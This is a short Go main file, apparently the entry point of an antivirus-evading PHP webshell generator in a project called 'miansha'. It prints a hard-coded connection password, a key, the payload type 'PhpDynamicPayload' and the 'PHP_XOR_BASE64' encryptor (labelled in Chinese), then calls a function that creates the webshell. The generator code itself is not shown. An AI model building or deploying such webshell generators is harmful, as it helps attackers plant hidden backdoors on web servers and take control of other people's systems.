package main

import (
	"fmt"
	"miansha/webshell/warn"
	"miansha/webshell/webshell"
)

func main() {
	warn.Warn()
	fmt.Printf("密码：Xioa\n密钥：%v\n有效载荷：PhpDynamicPayload\n加密器:PHP_XOR_BASE64", webshell.Key)
	webshell.WebCreate()

}
